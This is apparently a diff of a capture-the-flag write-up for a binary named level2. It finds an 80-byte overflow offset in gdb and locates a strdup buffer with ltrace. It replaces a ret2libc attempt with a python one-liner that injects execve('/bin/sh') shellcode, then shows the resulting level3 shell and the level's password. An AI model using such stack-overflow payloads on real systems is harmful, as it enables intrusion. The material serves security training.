@@ -5,17 +5,22 @@ disassemble p
 
 there is a _gets_ function call in p()
 
-int main(int argc, char**argv)
-{
-    printf("%p\n", getenv(argv[1]));
-}
+/------------------------------------/
 
-gcc main.c -o /tmp/a.out
+    We can calculate the offset
+    https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
 
-export EXPL=/bin/sh
-/tmp/a.out
+    (gdb) run 
+    Starting program: /home/user/level2/level2 
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
-0xbffff91e ## changes every time. This is the address of /bin/sh variable in memory
+    Program received signal SIGSEGV, Segmentation fault.
+    0x37634136 in ?? ()
+
+    OFFSET: 80
+
+/------------------------------------/
 
 gdb level2:
     b p                 ## breakpoint in p()
@@ -28,14 +33,24 @@ $2 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
 we will build a string which contains the buffer size in AAA + ret + system + anything + $EXPL
 
-python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x1e\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ./level2
-python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ./level2
-cat /tmp/exploit - | ./level2
+using ltrace we can find where strdup string is located:
 
+ltrace ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)           = 0x0804a008
 
-python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x12\xf9\xff\xbf" + "\x12\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ~/level2
+0x0804a008 -> \x08\xa0\x04\x08
 
+Some little shellcode found here:
+http://shell-storm.org/shellcode/files/shellcode-811.php
+Length: 28 bytes
 
-x35 xf9 xff xbf
+The string consists of the shellcode + the rest of the buffer "AAA" + the address of the strdup'd memory.
 
-$> python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/payload2
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" + "\xe3\x89\xc1\x89\xc2\xb0\x0b"+ "\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * (80 - 28) +  "\x08\xa0\x04\x08" ' > /tmp/exploit
+cat /tmp/exploit - | ~/level2
+
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
